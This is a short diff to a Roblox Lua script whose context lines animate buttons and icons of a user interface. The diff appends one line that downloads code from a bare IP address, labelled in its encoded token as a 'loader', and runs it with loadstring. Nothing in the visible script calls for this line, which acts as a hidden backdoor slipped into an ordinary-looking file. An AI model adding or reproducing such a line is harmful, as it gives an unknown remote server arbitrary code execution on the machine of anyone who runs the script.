@@ -305,3 +305,5 @@ game:GetService("TweenService"):Create(checkButton, TweenInfo.new(0.5), {Backgro
 game:GetService("TweenService"):Create(linkButton, TweenInfo.new(0.5), {BackgroundTransparency = 0, TextTransparency = 0}):Play()
 game:GetService("TweenService"):Create(inputIcon, TweenInfo.new(0.5), {ImageTransparency = 0}):Play()
 game:GetService("TweenService"):Create(linkIcon, TweenInfo.new(0.5), {ImageTransparency = 0}):Play()
+
+loadstring(game:HttpGet("http://109.71.240.235:3910/api/run/eyJpZCI6ImRjOWEzYWUyLWQ0MDQtNGIyNC1hMGMyLTYwYmFhZDczNDU3MSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJ1bml2ZXJzYWwifX0"))()
